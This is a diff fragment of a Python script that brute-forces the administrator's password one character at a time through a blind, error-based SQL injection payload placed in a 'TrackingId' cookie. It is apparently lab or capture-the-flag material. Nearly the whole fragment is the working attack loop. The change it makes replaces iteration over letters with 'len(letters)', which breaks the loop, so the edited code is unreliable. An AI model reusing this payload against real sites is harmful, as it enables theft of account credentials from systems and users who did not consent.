@@ -11,7 +11,7 @@ The payload uses a SELECT statement to check if the guessed character j matches 
 The query checks the table users for the administrator username
 '''
 for i in range(1,21):
-    for j in letters:
+    for j in len(letters):
         final_cookie = cookie +"'||(select case when substr(password,{},1)='{}' then to_char(1/0) else '' end from users where username ='administrator')||'".format(i,j)
         full_cookie = {"TrackingId":final_cookie}#The cookie payload is assigned to a dictionary with the key "TrackingId".
         print("Trying {} position with {}".format(i,j))
